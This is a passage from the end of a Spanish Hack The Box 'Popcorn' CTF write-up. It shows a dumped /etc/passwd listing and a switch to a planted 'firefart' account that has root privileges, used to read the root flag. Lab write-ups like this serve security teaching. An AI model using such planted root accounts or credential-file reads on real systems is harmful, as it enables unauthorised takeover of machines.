+sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+george:x:1000:1000:George Papagiannopoulos,,,:/home/george:/bin/bash
+mysql:x:104:113:MySQL Server,,,:/var/lib/mysql:/bin/false
+www-data@popcorn:/dev/shm<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Por lo tanto, migramos al usuario <strong>firefart</strong> con la contraseña que le indicamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@popcorn:/dev/shm<span class="nv">$ </span>su firefart
+Password: 
+firefart@popcorn:/dev/shm# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>firefart<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+firefart@popcorn:/dev/shm# 
+</code></pre></div></div>
+
+<p>Vemos que dicho usuario se encuentra en el grupo <code class="language-plaintext highlighter-rouge">root</code>, es como si cambiara el nombre de <strong>root</strong> por <strong>firefart</strong>, conservando todos los privilegios del usuario <strong>root</strong>; por lo tanto, de esta forma podemos visualizar la flag (root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#php" class="page__taxonomy-item" rel="tag">PHP</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">Web</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#medium" class="page__taxonomy-item" rel="tag">Medium</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-01-16T00:00:00-06:00">January 16, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-servmon/" class="pagination--pager" title="Hack The Box ServMon
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2022 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
